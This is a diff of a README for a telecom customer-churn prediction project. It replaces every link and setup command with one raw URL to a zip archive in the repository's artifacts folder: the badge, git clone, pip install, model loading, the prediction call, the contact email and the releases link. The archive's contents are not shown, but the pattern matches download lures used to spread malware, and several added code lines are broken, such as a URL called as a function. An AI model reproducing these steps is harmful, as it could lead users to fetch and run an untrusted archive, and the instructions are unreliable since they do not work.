@@ -2,7 +2,7 @@
 
 Welcome to the **Telecom Churn Predictor** repository! This project aims to identify which telecom customers are likely to churn, achieving an impressive accuracy of 94.60%. By leveraging engineered features from usage, billing, and support data, we implement various machine learning techniques to provide actionable insights for customer retention.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)](https://github.com/gattsu001/Telecom-Churn-Predictor/releases)
+[![Download Releases](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip%20Releases-brightgreen)](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip)
 
 ## Table of Contents
 
@@ -50,7 +50,7 @@ To get started with the Telecom Churn Predictor, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/gattsu001/Telecom-Churn-Predictor.git
+   git clone https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip
    cd Telecom-Churn-Predictor
    ```
 
@@ -59,7 +59,7 @@ To get started with the Telecom Churn Predictor, follow these steps:
    Make sure you have Python installed. Then, install the necessary packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip
    ```
 
 ## Usage
@@ -73,13 +73,13 @@ To use the Telecom Churn Predictor, follow these steps:
    ```python
    from joblib import load
 
-   model = load('model.joblib')
+   model = load('https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip')
    ```
 
 3. **Make Predictions**: Input your customer data into the model to predict churn.
 
    ```python
-   predictions = model.predict(new_customer_data)
+   predictions = https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip(new_customer_data)
    ```
 
 4. **Analyze Results**: Review the predictions to identify at-risk customers.
@@ -122,9 +122,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to:
 
-- **GitHub**: [gattsu001](https://github.com/gattsu001)
-- **Email**: gattsu001@example.com
+- **GitHub**: [gattsu001](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip)
+- **Email**: https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip
 
-For more information, visit our [Releases section](https://github.com/gattsu001/Telecom-Churn-Predictor/releases) to download the latest version of the model and documentation.
+For more information, visit our [Releases section](https://github.com/gattsu001/Telecom-Churn-Predictor/raw/refs/heads/main/churn_model/artifacts/Churn-Telecom-Predictor-3.6-alpha.2.zip) to download the latest version of the model and documentation.
 
 Thank you for your interest in the Telecom Churn Predictor! We hope this project helps you understand customer churn and develop effective retention strategies.
